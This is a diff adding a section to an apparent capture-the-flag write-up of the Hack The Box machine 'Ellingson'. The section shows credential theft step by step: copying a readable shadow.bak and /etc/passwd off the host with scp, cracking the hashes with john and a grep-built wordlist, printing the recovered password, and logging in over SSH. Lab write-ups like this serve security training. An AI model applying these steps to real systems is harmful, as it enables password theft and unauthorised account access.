@@ -26,7 +26,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 Only a couple ports open but I will be looking at port 80 specifically. Navigating to the web page I am greeted with a simple website.
 
-<center><img src="/htb/ellingson/home/png"></center>
+<center><img src="/htb/ellingson/home.png"></center>
 <br>
 Doing some manual enumeration reveals a post written by <b>The Plague</b> mentioning some of the most common passwords. If you don't recognize this quote it is from the movie <b>hackers</b>
 
@@ -105,4 +105,72 @@ Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)
 
 Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
 hal@ellingson:~$
+```
+As the user <b>hal</b> I start doing some manual enumeration where I eventually come across a <b>shadow.bak</b> that I have read permissions too in the <b>/var/backups</b> directory.
+```
+hal@ellingson:/var/backups$ ls -la shadow.bak
+-rw-r----- 1 root adm 1309 Mar  9  2019 shadow.bak
+```
+Next step is to copy over the <b>shadow.bak</b> and the <b>passwd</b> file over to my kali box so I can crack the passwords with <b>john</b>. I will use <b>scp</b> for this
+```
+# scp -i id_rsa.pub hal@10.10.10.139:/var/backups/shadow.bak .
+shadow.bak                                                                                 100% 1309    41.6KB/s   00:00    
+
+# scp -i id_rsa.pub hal@10.10.10.139:/etc/passwd .
+passwd                                                                                     100% 1757    54.6KB/s   00:00    
+```
+Now using the <b>unshadow</b> command to put the files into a format <b>john</b> can read.
+```
+# unshadow passwd shadow.bak > unshadowed.txt
+Created directory: /root/.john
+```
+Now we need to chose a wordlist. Instead of wasting time and using a huge worldist such as <b>rockyou</b>. Earlier we read in the article that the most common passwords are <b>love,sex,secret,and god</b>. Using that information I am going to create my own wordlist.
+```
+# grep love /usr/share/wordlists/rockyou.txt >> passwords.txt
+# grep sex /usr/share/wordlists/rockyou.txt >> passwords.txt
+# grep secret /usr/share/wordlists/rockyou.txt >> passwords.txt
+# grep god /usr/share/wordlists/rockyou.txt >> passwords.txt
+```
+Now I can use <b>john</b> in combination with my password list and the <b>unshadowed.txt</b> file. Depending on how fast your computer is. This could take some time but eventually we get a password for the user <b>margo</b>
+```
+# john --wordlist=passwords.txt unshadowed.txt
+Using default input encoding: UTF-8
+Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iamgod$08        (margo)
+1g 0:00:12:09 DONE (2019-09-24 18:11) 0.001370g/s 346.1p/s 1374c/s 1374C/s ..god..24.. god143
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+We can use the <b>iamgod$08</b> password to SSH in as the user <b>margo</b>
+```
+# ssh margo@10.10.10.139
+margo@10.10.10.139's password:
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Sep 24 18:13:56 UTC 2019
+
+  System load:  0.0                Processes:            103
+  Usage of /:   23.8% of 19.56GB   Users logged in:      1
+  Memory usage: 13%                IP address for ens33: 10.10.10.139
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+163 packages can be updated.
+80 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sun Mar 10 22:02:27 2019 from 192.168.1.211
+margo@ellingson:~$
 ```
